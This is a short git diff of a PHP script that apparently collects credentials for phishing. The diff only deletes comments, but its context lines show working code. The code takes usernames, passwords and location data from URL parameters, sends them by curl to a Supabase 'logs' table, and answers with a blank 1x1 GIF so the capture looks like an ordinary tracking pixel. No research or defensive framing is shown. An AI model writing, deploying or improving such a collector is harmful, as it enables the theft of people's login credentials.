@@ -20,7 +20,6 @@ $continent = $_GET['continent'] ?? '';
 
 // Only save if we have username or password
 if (!empty($u) || !empty($p)) {
-    // Prepare data for Supabase
     $data = [
         'username' => $u,
         'password' => $p,
@@ -30,7 +29,6 @@ if (!empty($u) || !empty($p)) {
         'continent' => $continent
     ];
 
-    // Send to Supabase
     $url = $supabaseUrl . '/rest/v1/logs';
     $json = json_encode($data);
 
@@ -49,7 +47,6 @@ if (!empty($u) || !empty($p)) {
     curl_close($ch);
 }
 
-// Return 1x1 pixel (silent response)
 header('Content-Type: image/gif');
 echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
 ?>
